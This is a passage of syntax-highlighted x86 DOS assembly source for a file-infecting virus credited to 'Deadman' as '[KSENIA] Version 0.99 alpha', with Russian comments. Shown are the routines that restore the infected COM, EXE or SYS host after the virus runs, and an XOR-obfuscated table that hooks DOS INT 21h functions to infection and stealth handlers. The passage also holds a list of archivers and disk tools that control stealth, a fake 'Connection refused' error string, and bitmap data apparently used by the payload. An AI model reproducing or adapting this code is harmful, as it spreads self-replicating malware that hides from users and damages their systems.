        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">psp</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">0fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">103h</span><span class="sc4">],</span><span class="sc5">msize</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">101h</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc0">          </span><span class="sc1">; exit code in AL</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">          </span><span class="sc1">; DOS program terminate</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">


══════════════════════════════════════════════════════════════════════════════
 </span><span class="sc5">complete</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">           </span><span class="sc1">; восстановить сегментные</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">           </span><span class="sc1">; регистры и сохранить их значение в ax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">original</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">            </span><span class="sc1">; si-сохраненное начало хоста</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc12">'MZ'</span><span class="sc0">                   </span><span class="sc1">; откуда стартовали?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">run_exe</span><span class="sc0">                   </span><span class="sc1">; 'MZ' 'ZM' -&gt; из ЕХЕшника</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">                   </span><span class="sc1">; 0ffffh -&gt; из SYSа</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">run_exe</span><span class="sc0">                   </span><span class="sc1">; иначе из СОМа</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">run_sys</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">        </span><span class="sc1">; стартовали из СОМа,</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">; восстановить начало</span><span class="sc0">
        </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; джамп на 6890h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">6890h</span><span class="sc0">        </span><span class="sc1">; а это-nop/push 0100</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; джамп на C3h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc0">         </span><span class="sc1">; тобишЬ ret</span><span class="sc0">

 </span><span class="sc5">run_exe</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc0">         </span><span class="sc1">; восстанавливаем ЕХЕшник</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; старое IP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_ip</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; старое CS</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; + PSPSeg+10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_cs</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; старое SP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_sp</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; старое SS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_ss</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0bch</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">_ss</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">           </span><span class="sc1">; mov sp,ss_value</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0bch</span><span class="sc0">            </span><span class="sc1">; mov ss,sp</span><span class="sc0">
 </span><span class="sc5">_sp</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; mov sp,sp_value</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">                     </span><span class="sc1">; sti</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">            </span><span class="sc1">; far jump instruction</span><span class="sc0">
 </span><span class="sc5">_ip</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">_cs</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

 </span><span class="sc5">run_sys</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">

 </span><span class="sc5">pushall</span><span class="sc0">      </span><span class="sc9">macro</span><span class="sc0">
              </span><span class="sc6">pushf</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc9">endm</span><span class="sc0">

 </span><span class="sc5">popall</span><span class="sc0">       </span><span class="sc9">macro</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">popf</span><span class="sc0">
              </span><span class="sc9">endm</span><span class="sc0">

 </span><span class="sc5">copyright</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'[KSENIA]'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Version 0.99 alpha'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Copyright (C) '</span><span class="sc4">,</span><span class="sc5">??date</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc5">??time</span><span class="sc4">,</span><span class="sc12">' by Deadman'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'The Global Project devoted to Ksenia Chizhova'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">nmess</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'External System Error #05. Connection refused.'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">endnmess</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc5">wino32bit</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' /d:c'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">

 </span><span class="sc5">stdisable</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'PKZIP'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'RAR'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ARJ'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'LHA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ARC'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'DEFRAG'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SPEEDISK'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CHKDSK'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'BACKUP'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MSBACKUP'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SCANDISK'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'NDD'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">

 </span><span class="sc5">funcs</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">tsrtest</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eh</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">select</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3dh</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">infect</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">43h</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">infect</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4bh</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">infect</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">56h</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">infect</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">6ch</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">extinfect</span><span class="sc0">

              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">fcbstealth</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12h</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">fcbstealth</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4Eh</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">dtastealth</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4Fh</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">dtastealth</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">terminate</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">31h</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">terminate</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4Ch</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">terminate</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">32h</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">getdpb</span><span class="sc0">

              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">42h</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">seekstealth</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3fh</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">readstealth</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">writehandler</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">57h</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">datestealth</span><span class="sc0">
 </span><span class="sc5">endf</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc5">original</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">27</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

 </span><span class="sc5">epb</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0h</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc0">     </span><span class="sc1">;    Адрес коммандной строки</span><span class="sc0">
 </span><span class="sc5">seg0</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">5ch</span><span class="sc0">     </span><span class="sc1">;    Адрес первого FCB</span><span class="sc0">
 </span><span class="sc5">seg1</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">6ch</span><span class="sc0">     </span><span class="sc1">;    Адрес второго FCB</span><span class="sc0">
 </span><span class="sc5">seg2</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">

 </span><span class="sc5">keyword</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">25h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">17h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">1Eh</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
 </span><span class="sc5">copy</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'123 4 5 Deadman'</span><span class="sc0">
 </span><span class="sc5">endcopy</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc5">smb_pattern</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10100111b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10100100b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11000111b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10100001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10100111b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01111110b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01111110b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11101001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10001001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11101101b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10001011b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11101001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01111110b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01111110b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11100110b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01001001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01001111b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01001001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11101001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01111110b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01111110b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00111100b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01000010b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10011001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10100001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10100001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10011001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01000010b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00111100b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11101001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10101001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10101001b</span><span class="sc0">
